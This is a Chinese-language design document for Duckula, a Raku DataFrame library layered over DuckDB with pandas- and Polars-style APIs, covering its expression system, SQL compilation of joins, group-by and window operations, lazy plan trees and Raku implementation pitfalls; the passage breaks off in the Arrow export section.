# Duckula 架构设计

> pandas / Polars 风格的 DataFrame API，跑在 DuckDB 上，用 Raku 写。

---

## 1. 定位

一句话：**Duckula 是 DuckDB 之上的关系算子层与表达式层，对外提供 pandas 和 Polars 两种风味的 API。**

明确**不写**的三件事：

| 不写 | 因为已经有 |
|---|---|
| DuckDB FFI / NativeCall 绑定 | `DB::DuckDB::Native`（632 行，C API 全覆盖） |
| 列式内存模型与零拷贝取值 | `DB::DuckDB::ColumnView`（806 行） |
| 计算引擎（filter / join / groupby 的实现） | DuckDB 本身就是引擎，翻译成 SQL 交给它 |

明确**只写**的三件事：

1. **表达式系统**（`col("x") + 1` 这类，惰性构建）
2. **关系算子 → SQL 的编译**（`filter/select/group-by/join/sort/limit`）
3. **三种入口**（pandas 的 eager 风格 + Polars 的 lazy 风格 + 直接写 SQL）

这个边界的意义：**Duckula 不拥有任何一行数据**。数据永远在 DuckDB 的向量里，Duckula 只拥有"下一步算什么"的描述。

---

## 2. 命名

`Duckula` = **Duck** + **Dracula** 的混成词，取自 1988 年 Cosgrove Hall 动画《Count Duckula》（内地译《怪鸭历险记》，92 年江苏台引进）。

选它的四个理由：

- **Duck** 直接指向 DuckDB，比 `Panduck` 之类只含半只鸭的名字更纯。
- 词本身就是混成词，天然隐喻"同时兼容两套 API 的缝合体"。
- 角色设定是家族里的**异类**——素食吸血鬼、不吸血、怕血、讨厌阴森城堡、"不是传统吸血鬼"。这正是"一个不像传统 DataFrame 库的 DataFrame 库"。
- 无命名冲突：`panduck` 已被 DuckDB 官方社区扩展占用（`INSTALL panduck FROM community`），且 npm / crates.io 各有同名包；`Duckula` 干净。

家族命名：`DB::DuckDB`（驱动）→ `App::DuckETL`（ETL 应用）→ `Duckula`（DataFrame API），三者构成 `Duck*` 系列。

---

## 3. 分层

```
┌─────────────────────────────────────────────────────────┐
│ Duckula · 新建                                          │
│                                                         │
│   ┌──────────────────┐      ┌──────────────────┐        │
│   │ Frame / Series   │      │ Expr / LazyFrame │        │
│   │ pandas 风格门面   │      │ 惰性计划 + SQL 生成│        │
│   └──────────────────┘      └──────────────────┘        │
│   ─────────────────────────────────────────────────     │
│   借鉴 DuckETL：Planner 拓扑排序 · SQL 纯函数 · Step 模型 │
└──────────────────────────┬──────────────────────────────┘
                           │  only SQL strings
┌──────────────────────────▼──────────────────────────────┐
│ DB::DuckDB 1.0.1 · 直接 use，零改动                      │
│                                                         │
│  Result · ColumnView   │   Arrow   │  Appender · Parquet │
│  零拷贝列视图           │  零拷贝嵌套│  批量写与落盘       │
└─────────────────────────────────────────────────────────┘
```

关键约束：**层间只传 SQL 字符串和 Result 引用**，不传数据副本。

---

## 4. 直接复用清单（`use` 即可）

| Duckula 需要 | 从 DB::DuckDB 取 | 备注 |
|---|---|---|
| 连接 / 查询 / 执行 | `DB::DuckDB.new(...).connect` → `.query` / `.execute` | 支持 `:stream` 流式结果 |
| 列数据（零拷贝） | `Result.column-views` → `ColumnView` | 数值型直读向量内存 |
| 单列取值 | `Result.column($idx)` | 装箱 Array，慢但通用 |
| 标量聚合 | `ColumnView.sum/min/max/count/mean` | **禁止自己写循环** |
| 窗口切片 | `ColumnView.slice($from, $count)` | 返回新 view |
| 空值判定 | `ColumnView.is-null($i)` | |
| 嵌套类型遍历 | `DB::DuckDB::Arrow` | LIST/STRUCT/MAP 递归，不 stringify |
| 批量写入 | `Appender.append-rows` / `Connection.insert-rows` | |
| Parquet 读写 | `Connection.read-parquet` / `write-parquet` / `parquet-schema` | |
| DBIish 互通 | `DB::DuckDB::Bridge` | 若 Duckula 要暴露到 DB 接口 |
| 元信息 | `Result.names` / `column-types` | 列名与 SQL 类型 |

---

## 5. 借鉴设计（模式复用，非代码复用）

### 5.1 SQL-first + 惰性计划

DuckETL 的 `App::DuckETL::Planner`（553 行）已验证这条路：Step 建模 → 拓扑排序 → 生成 SQL → Executor 执行。

Duckula 照此建模 LazyFrame（v0.9.0 已实现，细节见 §8.11）：

```
LazyFrame.filter(expr)   → 计划节点（不入库）
LazyFrame.group-by(col)  → 计划节点
LazyFrame.sort(col)      → 计划节点
LazyFrame.collect        → 编译成一条 SQL，一次执行
```

红利：
- 零计算代码，`join/groupby/window` 全部由 DuckDB 执行器完成。
- 天然支持 lazy，且能做结构层面的融合（相邻 filter 合并、filter 与 group-by 同层）。
  真正的谓词/列裁剪下推不自己写 —— DuckDB 优化器已经在做，重复实现只是自娱。
- 大表不物化，内存只受 DuckDB 控制。

### 5.2 `App::DuckETL::SQL` 纯函数层（必须复用）

412 行纯函数、无 I/O、无连接句柄：

- `quote-ident(Str)` — 双引号包裹并转义内部 `"`
- `sql-literal($value)` — Bool/Numeric/Str/Positional 的多重分派
- `split-target("schema.table")` — 校验并拆分
- `qualified-target(Str)` — 输出 `"schema"."table"`

原注释明确写了："标识符可含任意字符，Unicode（含 CJK）、空格、引号都安全"。**Duckula 自己拼 SQL 若不复用这套，中文列名一定出事。**

### 5.3 Step 的纯数据建模

`App::DuckETL::Step` 每个步骤都是可 `to-hash` / `from-hash` 往返的纯数据，带 `materialize`（是否落地临时表）与 `depends_on`（依赖）。

Duckula 的计划节点照此建模，白送：序列化、调试打印、跨进程传递。

### 5.4 `from-hash` 白名单校验

`%allowed` 集合 + 未知字段直接 `die`。Duckula 若支持从 JSON / 配置构建 Frame，照抄这个防御式写法。

---

## 6. 明确不继承

| 内容 | 原因 |
|---|---|
| `App::DuckETL::TUI`（2736 行） | 产品形态不同 |
| `App::DuckETL::CLI`（1458 行） | 同上 |
| `augment class` + `MONKEY-TYPING` 的 DSL 扩展 | 能用但脆弱，预编译/多模块场景易炸 |
| `IsolatedRun` 进程隔离 | 与 DataFrame 语义无关 |
| `Store` / `Repo` 元数据层 | ETL 的编排概念，Duckula 不需要 |

---

## 7. 已知坑（动手前必读）

### 7.1 ColumnView 的生命周期（最容易翻车）

`ColumnView` 的指针属于 `duckdb_result`，不是 view 自己。`DB::DuckDB::ColumnView` 的头注释写明：

> The pointers belong to the `duckdb_result`, not to the view. ... Calling `.free` on the result yourself invalidates every view taken from it.

因此 **`Duckula::Series` 若长期持有 ColumnView，必须同时持有 Result 的引用**，否则 GC 掉 Result 就是悬垂指针。

v0.4.0 的实现：`Series` 有两个"保命"属性——`$!result`（钉住 result）与 `$!frame`（来源 Frame，
给 `head` 之类需要重走 SQL 的操作）。`Frame.column` 每次都会重新 `query` 一次 `relation-sql`
拿新 Result，因为物化路径已经消耗掉上一个结果集的游标。

另外：`DB_DUCKDB_NO_COLUMN_VIEW=1` 会让 `column-views` 整体回退到 `column-arrays`；非数值类型（VARCHAR / LIST / STRUCT / ENUM / 日期 / interval）的 `$.raw` 为 False，只能懒解码。Series 必须容忍这两条路径。

### 7.2 `sink` 的 sink-context 陷阱

Raku 在表达式被丢弃时会调用无参 `.sink()`。若类里定义了 `multi method sink($target)`，不加 no-op 候选会报 `Cannot resolve caller sink`。

DuckETL 的 DSL 里留了这条注释，Duckula 写 `$df.sink("table")` 时直接照抄：

```raku
multi method sink(--> Nil) { }              # 必须有
multi method sink(Str:D $target, *%opts) { ... }
```

### 7.3 不要用 `augment class`

见 §6。链式 API 直接在类里定义即可。

---

## 8. API 草案

### 8.1 读取

```raku
use Duckula;

my $df = duckula.read-csv("orders.csv");        # ✅ v0.4.0
my $df = duckula.read-parquet("orders.parquet");# ✅ v0.4.0
my $df = duckula.sql("select * from read_csv_auto('orders.csv')");

# 惰性入口（Polars 的 scan_csv）：只建计划节点，一个字节都不读
my $lf = duckula.scan-csv("orders.csv");        # ✅ v0.9.0
my $lf = duckula.scan-parquet("orders.parquet");# ✅ v0.9.0
```

`read-csv` / `read-parquet` 的**路径作为绑定参数**传入，不拼进 SQL 文本；
带单引号的文件名（`tmp-o'rders.csv`）已实测安全。

> 没有 `Duckula.read-csv` 这种模块级函数：`read-csv` 太通用，不想污染导出的命名空间。
> 统一走会话：`duckula.read-csv(...)` 或 `Duckula::Session.new.read-csv(...)`。

### 8.2 pandas 风格（eager，每次操作立即出结果）

```raku
$df.head(5);
$df.shape;                       # (rows, cols)
$df.names;                       # 列名
$df{'amount'};                   # 单列 → Series（注意是 {} 不是 []，见 8.6）
$df[0];                          # 按位置取列
$df.select('city', 'amount');    # 多列 → Frame
$df.filter({ $^r<amount> > 100 });
$df.group-by("city").sum("amount");
$df.sort-values("amount", :desc);
$df.to-parquet("out.parquet");

# SQL 直写：self 指当前 Frame（内部落成临时视图，见 §9）
$df.sql("select city, sum(amount) as total from self group by city");
```

> v0.4.0 已实现：`head` / `shape` / `names` / `{'col'}` / `[i]` / `select` / `sql`。
> `filter` / `group-by` / `sort-values` / `to-parquet` 属阶段 2、5、7。

### 8.3 Polars 风格（lazy，collect 才执行）

```raku
my $lf = $df.lazy
   .filter(col('amount') > 100)
   .with-column((col('amount') * 1.1).alias('taxed'))
   .group-by('city')
   .agg(col('amount').sum.alias('total'))
   .sort-values('total', :desc)
   .limit(10);

say $lf.explain;      # 计划树 + 生成的 SQL
my $out = $lf.collect;   # 这里才执行
```

读文件也有惰性入口（Polars 的 `scan_csv`）：

```raku
my $lf = $duckula.scan-csv('orders.csv');   # 一个字节都不读
say $lf.names;                              # 只问 schema（LIMIT 0）
say $lf.collect.rows.elems;                 # 这才扫文件
```

`Frame` 与 `LazyFrame` 的分工（v0.9.0）：

| | `Frame`（pandas 风格） | `LazyFrame`（Polars 风格） |
|---|---|---|
| 真相 | 已经拼好的 SQL 字符串 | 计划树 |
| 每次算子 | 立刻在外面套一层 `SELECT` | 只加一个计划节点 |
| SQL 形状 | 十步十层子查询 | 融合后通常只有一层 |
| 执行时机 | 取数据时（`rows` / `elems`） | 取数据时（`collect`） |
| 参数绑定 | 拼 SQL 时固化 | 一直留 `?`，`collect` 才绑 |

**两者语义完全一致**：列名白名单、表达式、聚合规则、join 后缀规则、窗口锚定
都走同一套代码（`GroupBy.spec` / `join-layout` / `Plan::Project`），所以
`t/12-lazy.rakutest` 直接拿 eager 结果当标准答案逐条对账。

细节见 §8.11。

### 8.4 表达式

```raku
col("amount") + 1;                  # ("amount" + 1)
col("amount") > 100;                # ("amount" > 100)
col("city").starts-with("北");      # starts_with("city", '北')
col("city").contains("京");         # contains("city", '京')
col("amount").sum;                 # sum("amount")
col("amount").mean;                # avg("amount")
col("flag").not;                   # (NOT "flag")
```

每个 Expr 自身持有一段 SQL 片段，`render` 时拼成完整查询。v0.5.0 已实现。

除 `$.sql` 外，Expr 还带三样元信息，都是下游算子要用、但事后无法从字符串反推的：

| 属性 | 用途 |
|---|---|
| `$.columns` | 引用了哪些列 → Frame 拿它和 `names` 对账（防注入白名单） |
| `$.label` | 自动列名候选（`amount_sum`）→ `agg` 用它命名 |
| `$.is-aggregate` | 顶层是否聚合 → `agg` 用它拒绝非聚合表达式 |

`.alias($n)` 会把三者一并带过去，只覆盖输出名。

**Expr 自带 `$.columns`，这是防注入的关键。** 表达式是拼出来的，Frame 拿到的只是
一段字符串，没法再反解出列名。所以每个 Expr 在构造时就把「引用了哪些列」记进一个
`Set`，Frame 执行前拿它和 `names` 对账——拼错列名当场报错，而不是让 DuckDB 在外层
子查询里默默绑定到别的列。

#### Raku 运算符重载的三个坑

这些是实现时才发现的，重写一遍还会再撞：

| 坑 | 现象 | 对策 |
|---|---|---|
| `prefix:<!>` 不能重载 | `Too many symbols provided for categorical of type prefix; needs only 1` | 取反写成 `.not` 方法 |
| 类别内前向引用崩 resolver | `Use of Nil in string context` + `Cannot unbox a type object (Nil) to a str`，不是友好报错 | 别让 `A` 的方法返回类型指向后面才定义的 `B` |
| 插值里的 `$fn(...)` | `No such method 'CALL-ME' for string 'sum'` | 写成 `$fn ~ '(' ~ $!sql ~ ')'` |
| 方法体引用文件后面才声明的 lexical 常量 | 同样的 `Use of Nil in string context` + `Cannot unbox a type object (Nil) to a str` | 常量声明挪到 `class` 之前 |

第三条特别阴——`"$fn({$!sql})"` 看起来像模板插值，但 Raku 会把 `$fn(...)` 当成函数调用
去执行，而 `$fn` 只是个 Str。

第四条也是 v0.6.0 撞的：`%AGG-SUFFIX` 原本写在 `class Duckula::Expr` 之后，方法里
`%AGG-SUFFIX{$fn}` 直接让编译器内部崩掉，报的错跟常量完全无关。**文件和类的布局顺序
在 Raku 里是有语义的**，这类崩溃不给出真实原因，只能靠二分编译定位（`raku -c` 逐个
文件、逐段删代码）。

#### 为什么是 `.starts-with` 而不是 `.str.starts-with`

原本想做 `.str` 二级对象（更像 Polars），但它会引入 `Duckula::Expr` → `Duckula::ExprStr`
的跨类前向引用，直接触发上表第二条。改成扁平的 `col('city').starts-with('北')`，
反而更短。

### 8.5 Series

```raku
my $s = $df{'amount'};
$s.sum; $s.mean; $s.min; $s.max; $s.elems;
$s.head(3); $s.to-list;
```

Series 是 `ColumnView` 的薄包装，聚合方法直接代理，零计算开销。✅ v0.4.0 已实现。

**解决了字符串聚合的旧问题。** v0.3.0 里 `sum(amount)` 经 `Result.arrays` 出来是
字符串（HUGEINT 被解码成十进制文本），现在 `Series.sum` 直接走 `ColumnView.sum`
走向量内存，BIGINT 列返回真正的 `Int`（实测 `is $s.sum, 600` 且 `.WHAT === Int`）。

#### Frame.rows 的类型还原（v0.6.1）

`Frame!materialize` 原先走 `Result.arrays`，而 `sum(bigint)` 在 DuckDB 里是
**HUGEINT（128 位整数）**，驱动把它解码成十进制字符串——于是 `$grouped.rows`
里会出现 `"450"`，分组聚合一看就像 bug。

改成优先走 `ColumnView`：每个视图带 `.type`，据此按列还原：

| DuckDB 类型 | 还原成 | 说明 |
|---|---|---|
| `HUGEINT` / `UHUGEINT` / `BIGNUM` | `Int` | Raku 的 Int 无位宽上限，128 位也不溢出（实测 `92233720368547758070` 不失真） |
| `DECIMAL(p,s)` | `Rat` | 精确有理数，不是浮点 |
| 其余 | 原样 | `VARCHAR` 本来就是字符；`BIGINT` / `DOUBLE` 驱动已解码正确 |

`DB_DUCKDB_NO_COLUMN_VIEW=1` 关掉视图时自动退回 `arrays` 路径，两条路径的行都是
`Array`，对调用方形态一致。

**剩下的真实边界**：只有 `ColumnView` 能给出类型，所以 `Result.arrays` 那条退路
下 HUGEINT 仍然是字符串。这是驱动的解码层行为，不是 Duckula 能修的。

**`head` 走 SQL 而不是 `ColumnView.slice`**：`slice` 返回的是重新解码出来的 view，
`$.raw` 为 False，而 `ColumnView!agg` 开头就是 `return Any unless $!raw` —— 聚合会直接
返回空值。所以 `Series.head` 改成 `$!frame.head($n).column($!name)`，多一次查询换回
raw 列，`$s.head(2).sum` 才能算出东西。

### 8.6 为什么是 `$df{'col'}` 而不是 `$df["col"]`

Raku 的 `[ ]` 是**位置**下标，会把索引先转成 `Int`：

```
> $df['amount']
Cannot convert string to number: base-10 number must begin with valid digits or '.' in '<HERE>amount'
```

实测连 `multi method AT-POS(Str:D $s)` 也救不回来——参数在进方法前就已经变成 `Failure` 了。
所以 pandas 的 `df["col"]` 在 Raku 里没有对应写法，只能用 `{}` / `<>`：

| 写法 | 结果 |
|---|---|
| `$df{'amount'}` / `$df<amount>` | 单列 Series |
| `$df{'city', 'amount'}` | 两个 Series 的 List（Raku 多值下标语义） |
| `$df[0]` | 第 0 列的 Series |
| `$df.select('city', 'amount')` | 多列 Frame |

注意 `$df{'city', 'amount'}` **不是**多列 Frame——Raku 会对每个 key 调一次 `AT-KEY`
再把结果收集成 List。要多列 Frame 就用 `.select`，语义更明确。

### 8.7 分组聚合（v0.6.0）

```raku
use Duckula::Expr;

$df.group-by('city')
   .agg(col('amount').sum.alias('total'), len().alias('n'));

$df.group-by('city', 'kind').agg(col('amount').sum);          # 列名自动为 amount_sum
$df.group-by(col('city').upper.alias('city_up')).agg(col('amount').max);
$df.group-by('city').count;                                    # 列名 count
$df.agg(len().alias('n'), col('amount').sum.alias('total'));   # 全表聚合
```

`group-by` 返回中间对象 `Duckula::GroupBy`，必须接 `.agg(...)` / `.count` 才出结果。
这样「只分组不聚合」的半成品在类型上就不存在。

**拼出的 SQL 长这样**（`GROUP BY` 用位置而不是重复表达式）：

```sql
SELECT "city" AS "city", sum("amount") AS "total", count(*) AS "n"
FROM (<上游 relation-sql>) AS __duckula_group
GROUP BY 1
```

#### 名字从哪来：`Expr.label`

`agg` 不强制写 `.alias(...)`，靠 Expr 自带的 `$.label` 推：

| 表达式 | label | 输出列名 |
|---|---|---|
| `col('amount')` | `amount` | （键）`amount` |
| `col('amount').sum` | `amount_sum` | `amount_sum` |
| `col('amount').mean` | `amount_mean` | `amount_mean`（`avg` 后缀统一成 `mean`，与 Series 对齐） |
| `len()` | `len` | `len` |
| `col('amount').sum * 2` | 类型对象（推不出） | 必须 `.alias(...)`，否则报错 |

推不出来就当场报错，而不是让 DuckDB 生成 `sum("amount")` 这种怪列名。重名（键与键、
键与聚合、聚合与聚合）也在 `agg` 里提前检测。

#### `is-aggregate` 挡住一半的错误用法

`agg(col('amount'))` 拼出来的 SQL 会报 "column must appear in the GROUP BY clause"，
天书一样。所以 Expr 自带 `$.is-aggregate`，`agg` 先查这个标志，非聚合表达式直接给出
「try col('x').sum / .mean / .min / .max / .count, or len()」。

`binop` 会把这个标志往下传，所以 `col('amount').sum * 2` 仍算聚合。

#### 键也要 `AS`

`col('city')` 渲染成 `"city"`，不加 `AS` 恰好同名；但 `col('city').upper.alias('cu')`
渲染成 `upper("city")`，不加 `AS` 输出列名就变成 `upper(city)`。所以键一律
`<expr> AS <quote-ident(名字)>`。

#### 循环依赖的处理：`Frame.derived`

`GroupBy` 需要造下游 `Frame`，但它不能 `use Duckula::Frame`——`Frame` 已经
`use Duckula::GroupBy`，双向 use 会在预编译期形成环。而且 `Duckula::Frame.new(...)`
在编译期会被解析成子例程调用，报 `Could not find symbol '&Frame' in 'Duckula'`。

解法是 `Frame.derived($sql)`：`GroupBy` 只在它握着的上游 frame 上调用这个方法，
一个 Frame 类型名都不写。以后别的外部模块（Planner、写入器）也照这个模式走。

### 8.8 连接（v0.7.0）

```raku
$orders.join($depts, on => 'dept_id');                    # 同名键，inner
$orders.join($depts, on => <dept_id region>);             # 多个同名键
$orders.join($depts, on => 'dept_id' => 'did');           # 异名键（Pair）
$orders.join($depts, on => 'dept_id', :how<left>);        # left / right / full / semi / anti
$orders.join($depts, :how<cross>);                        # 笛卡尔积，不需要 :on
$orders.join($depts, on => 'dept_id', :suffix('_d'));     # 冲突列的后缀，默认 _right
```

`:how` 取 `inner`（默认）/ `left` / `right` / `full`（`outer` 同义）/ `semi` / `anti` / `cross`。

**`on => ('a', 'b')` 被理解为两个同名键，不是「左 a 接右 b」** —— 异名必须写 Pair，
这样两种意图不会混。`on` 归一化后逐条白名单校验（左键必须在左表 `names` 里、
右键必须在右表 `names` 里、左键不许重复），所以拼错列名当场报错。

#### 拼出的 SQL

```sql
SELECT l."oid" AS "oid", l."dept_id" AS "dept_id", l."amount" AS "amount",
       r."dname" AS "dname", r."amount" AS "amount_right"
FROM (<左 relation-sql>) AS l
INNER JOIN (<右 relation-sql>) AS r ON l."dept_id" = r."dept_id"
```

不用 `USING`：`USING` 会按名匹配、拿不到「异名键」和「自定义后缀」。
手写列清单多几行，但输出列名、顺序、去重规则全在掌控里。

#### 列名规则：只在真冲突时加后缀

| 情况 | 输出 |
|---|---|
| 左表列 | 原名 |
| 右表**键**列 | 不输出（键列只在左侧出现一次，等价 `USING` 语义） |
| 右表非键列、与左侧不冲突 | 原名 |
| 右表非键列、与左侧冲突 | `原名 + :suffix`（默认 `_right`） |
| 后缀叠加后仍冲突 | 继续叠加（`amount_r` → `amount_r_r`） |

不做 pandas 那种「两边都加后缀」：为了 join 一次就把左表的列名全改掉，
在链式调用里代价太大。

#### `right` / `full` 的键列要 `coalesce`

右连接里未匹配的左行、全连接里两侧未匹配的行，键列必有一侧是 NULL。
直接用 `l."k"` 会让键列莫名变 NULL（实测过：`right` 连接下 `dept_id` 变成 `Any`）。
所以这两种情况键列写成 `coalesce(l."k", r."k") AS "k"` —— 这也正是标准 SQL
`USING` 的语义，只是手写列清单时得自己补。

#### `semi` / `anti` 不是 JOIN

半连接 / 反连接只输出左表的列，用 `WHERE [NOT] EXISTS` 表达：

```sql
SELECT l.* FROM (<左>) AS l
WHERE NOT EXISTS (SELECT 1 FROM (<右>) AS r WHERE l."dept_id" = r."dept_id")
```

#### `names` 改成只问 schema

`join` 要问两次列名（左右各一次）才能拼出输出列清单。原本 `Frame.names` 会
`!materialize`，也就把整张表拉进 Raku——join 一次等于白读两张表。

现在 `names` 走 `SELECT * FROM (<relation-sql>) LIMIT 0`，只拿 schema 一行不搬，
并缓存进 `$!names-known`。`select` / `filter` / `group-by` / `join` 都跟着变便宜。

#### 这一节踩到的四个 Raku 坑

| 坑 | 现象 | 对策 |
|---|---|---|
| `my List $x = (...,)` 被 itemize | `for $x -> $i` 把整个 List 绑给 `$i`，Pair 判断永远为假 | 收进 `my @x`（本文件第三次踩） |
| `$bool && %h{$k}:exists` | `You can't adverb &infix:<&&>` | 加括号：`$bool && (%h{$k}:exists)` |
| `$kind eq 'right' \| 'full'` | 得到 Junction，赋给 `Bool` 类型检查失败 | `$kind ∈ <right full outer>` |
| `:suffix => '_x'` | 解析成位置 Pair，报 `Cannot resolve caller join` | `:suffix('_x')` 或 `:suffix<_x>` |

第四个尤其值得记：**`:` 开头的命名参数后面不要再跟 `=>`**。`:suffix('_x')` 是
标准的「冒号对」写法，`suffix => '_x'` 也是，但两者混用会得到一个位置 Pair。

### 8.9 窗口函数（v0.8.0）

窗口是表达式的一部分，不是 Frame 的算子——它产出的是一列新值，所以入口是
`with-column`（`with-columns` 可一次加多列）：

```raku
$df.with-column(col('amount').sum.over('dept').alias('dept_total'));
$df.with-column((col('amount') / col('amount').sum.over()).alias('share'));
$df.with-column(col('amount').cum-sum('dept', :order-by<day>).alias('running'));
$df.with-column(col('amount').shift.alias('prev'));
$df.with-column(col('amount').diff.alias('d_dod'));
$df.with-column(col('amount').rank(:desc).alias('rk'));
$df.with-column(col('amount').rolling-sum(7, :order-by<day>).alias('ma7'));
```

| 方法 | SQL | 备注 |
|---|---|---|
| `.over(*keys, :$order-by, :$desc)` | `f(x) OVER (PARTITION BY … ORDER BY …)` | 给聚合加窗口 |
| `.cum-sum/-max/-min/-count` | `f(x) OVER (… ROWS UNBOUNDED PRECEDING)` | 按扫描顺序或 `:order-by` |
| `.shift($n)` | `lag(x, n)` / `lead(x, -n)` | 正数往前、负数往后 |
| `.diff($n)` | `x - lag(x, n) OVER (…)` | 环比 |
| `.rank(:desc, :$method)` | `rank` / `dense_rank` / `row_number` | 默认 `min`（并列跳号） |
| `.rolling-sum/-mean($w)` | `… ROWS BETWEEN w-1 PRECEDING AND CURRENT ROW` | 不满窗口按现有行算 |

#### 裸聚合自动广播

`with-column(col('x').sum.alias('t'))` 里的 `sum` 是**裸聚合**，会被补一个
`OVER ()` 变成逐行广播：

```sql
SELECT *, sum("x") OVER () AS "t" FROM (…)
```

不补会得到 `SELECT *, sum("x") AS "t"` —— DuckDB 按全表聚合处理，整个 frame
**当场塌成一行**。这与 Polars `with_columns(pl.col('x').sum())` 和 pandas
`df['t'] = df['x'].sum()` 的语义一致，所以不是"魔法"，是对齐。

补不上的情形（`(sum(x) / count(*))`）会明确报错而不是给个坏 SQL —— `OVER`
只能跟在一个函数调用后面，补在算术表达式末尾是语法错误。写法是让每个聚合
各自 `.over()`。

#### 窗口会改变行序，必须用行号锚回去

```raku
$t.with-column(col('v').rank(:desc).alias('r')).rows
# 期望：行序不变，只多一列
```

实测：`rank() OVER (ORDER BY v DESC)` 之后 DuckDB **直接按 v 降序吐行**，
`sum() OVER (PARTITION BY g)` 之后按组聚拢。这就违反了 with-column「只加一列、
别动别的」的约定（`t/09-window.rakutest` 里五个用例全挂在这上面）。

修法：内层先钉一个扫描序行号，算完窗口再按它排回来。

```sql
SELECT * EXCLUDE ("__duckula_ord") FROM (
  SELECT *, <窗口表达式> AS "r",
         row_number() OVER () AS "__duckula_ord"
  FROM (SELECT *, row_number() OVER () AS "__duckula_ord" FROM (…))
) AS __duckula_win_out ORDER BY "__duckula_ord"
```

行号列名会和现有列对账后改名（`__duckula_ord_`、`__duckula_ord__`……），
撞名时不会吞掉用户数据。**只对窗口表达式付这个代价**，普通 `with-column` 仍然是
一层 `SELECT *`。

#### 累积窗口为什么显式写 `ROWS`

`sum(x) OVER (ORDER BY id)` 的默认帧是 `RANGE UNBOUNDED PRECEDING`，**同值的行
被当成一个 peer group**，排序键有重复时多行拿到同一个累积值。显式写
`ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW` 才是严格按行推进，和 Polars
的 `cum_sum()` 一致。

### 8.10 切片（v0.8.0）

```raku
$df.head(10);   $df.limit(10);      # 前 10 行（两个名字等价）
$df.tail(10);                       # 末 10 行
$df.slice(5, 10);                   # 从第 6 行起取 10 行
$df.slice(-10);                     # 倒数 10 行
```

`head` / `limit` / 非负 `slice` 都是纯 `LIMIT` / `OFFSET`，零成本。

`tail` 和负 `slice` 麻烦一点：SQL 里没有"末尾"这个概念，必须先知道总行数。

- **`tail`** 用 `row_number() OVER ()` + `count(*) OVER ()`，**只扫一遍**数据，
  外层筛 `rn > 总数 - n`，顺序沿用扫描顺序（和 Polars 依赖 frame 行序一个意思）。
- **负 `slice`** 用 `OFFSET (SELECT greatest(count(*) - k, 0) FROM (…))` ——
  这会让关系被算两遍，但只多一次 `count(*)`，且 `greatest(…, 0)` 保证
  offset 比总行数还长时跳过全部而不是报负 OFFSET。

备选的「`tail` 也用 count 子查询」写法会让 CSV/Parquet 被完整扫两遍，所以没选。

### 8.11 计划树与 collect（v0.9.0）

`Frame` 的真相是一条 SQL 字符串，所以每加一个算子就在外面套一层
`SELECT * FROM (...)`。十步链式就是十层子查询 —— DuckDB 优化器吃得下，
但日志里没法看、给人 review 更没法看。

`LazyFrame` 改存**计划树**，`collect` 时才一次渲染：

```
aggregate 按 "g"          ← $lf.group-by('g').agg(...)
  filter   ("v" > 5)      ← $lf.filter(...)
    source   SELECT * FROM read_csv_auto(?)
```

#### 节点

| 节点 | 字段 | 渲染成 |
|---|---|---|
| `Source` | `sql`、`params` | `(<sql>) AS <alias>`（裸着就直接输出原 SQL） |
| `Project` | `items`、`anchored`、`exclude`、`anchor` | `SELECT <items> FROM (<input>)` |
| `Filter` | `pred`、`params` | 当前层的 `WHERE` |
| `Aggregate` | `items`、`group` | 当前层的 `SELECT` + `GROUP BY` |
| `Sort` | `order` | 当前层的 `ORDER BY` |
| `Limit` | `limit`、`offset` | 当前层的 `LIMIT` / `OFFSET` |
| `Join` | `left`、`right`、`mode`、`on-sql`、`items` | `JOIN` / `CROSS JOIN` / `WHERE EXISTS` |

渲染器把树自底向上累积成一个 `Query`（还没闭合的 SELECT 的各子句）。
**能往当前层塞就塞，塞不进去才物化成子查询**：

| 上游状态 | `Filter` | `Project` | `Aggregate` | `Sort` / `Limit` |
|---|---|---|---|---|
| 只有 FROM | 加 WHERE | 设 SELECT | 设 SELECT + GROUP BY | 设 ORDER BY / LIMIT |
| 已投影 / 已分组 | 物化 | 物化 | 物化 | 物化 |
| 已 LIMIT | — | 保留 | 物化 | 物化 |

于是 `filter().filter().filter().group-by().agg()` 渲染出来**只有一层**
（`WHERE` 和 `GROUP BY` 同层），而 `select().filter()` 该物化就物化 ——
因为 `WHERE` 引用的是投影后的列名，不物化会绑错列。

建树时还顺手合并了两种最常见的相邻节点：

- 相邻 `Filter` → 一个 `WHERE a AND b`；
- 相邻 `Limit` → 小的那个（`LIMIT 10` 套 `LIMIT 5` = `LIMIT 5`，offset 相加）；
- `Sort` 套 `Sort` → 外层覆盖内层，直接丢掉内层节点。

#### 参数一路不固化

惰性路径下 `?` 从头到尾留在 SQL 里，`collect` 时才交给驱动绑定：

```raku
my $lf = $duckula.scan-csv($path).filter('amount > ?', 1000);
$lf.relation-sql;   # ... WHERE amount > ?   ← 1000 不在这里
$lf.collect;        # 这时才绑
```

比 eager 路径更严的一条线：eager 为了能重新执行 `relation-sql`，会在拼 SQL
时就用 `render-bindings` 把值固化进去（转义正确，但值确实进了文本）。

参数顺序靠「深度优先 + 子查询总排在外层子句之前」保证：`Query` 带着
`params` 一起物化，所以 `(SQL, 参数)` 里 `?` 的出现顺序永远对得上。
`t/11-plan.rakutest` 里有专门的对账用例。

#### 计划树的边界

有些算子天生要「先知道结果」才能表达，只能在这里断开：

- `tail(n)` / 负 `slice` —— 要先数总行数（§8.10）；
- `LazyFrame.sql(...)` —— `self` 必须绑成临时视图，而建视图得立刻执行
  `CREATE VIEW`。所以它会把上游先渲染成 SQL、建好视图（参数此时用
  `render-bindings` 固化，视图里不能留占位符），再把用户 SQL 包成新的
  `Source` 节点继续往下攒。

断开不影响正确性，只是那一段不再参与融合。

#### 为什么类里全是标量属性

`Plan` 节点里「一列值」的字段一律写成 `$.items` 而不是 `@.items`：
`@`-sigil 属性在 `new` 里收到一个 `List` 会被 itemize 成 `((...),)`，
`@!items.elems` 于是永远等于 1。第一版就把聚合投影拼成了
`"g" AS "g" sum("v") AS "s"`（逗号没了），而且不报错 —— 是断言比字符串时
才发现。同 §7.1 那类「静默错」，只是这次栽在属性声明上。

---

### 8.12 Arrow 出口（v0.10.0）

`Frame.arrow` 返回 `Duckula::Arrow`，把一条关系同时导成**类型**和**数据**：

```raku
my $arrow = $df.filter(col('amount') > 100).arrow;
say $arrow.schema.gist;          # struct { id: l  city: u  amount: d:18,2 }
say $arrow.format-of('amount');  # d:18,2
$arrow.chunks(-> $chunk, $i { ... });
$arrow.free;
```

#### 为什么必须成对

Arrow 的 C data interface 有两半：`ArrowArray` 是 buffer（数据），`ArrowSchema`
是类型。只给 array 等于给一堆没人能命名的字节 —— `pyarrow.RecordBatch._import_from_c`
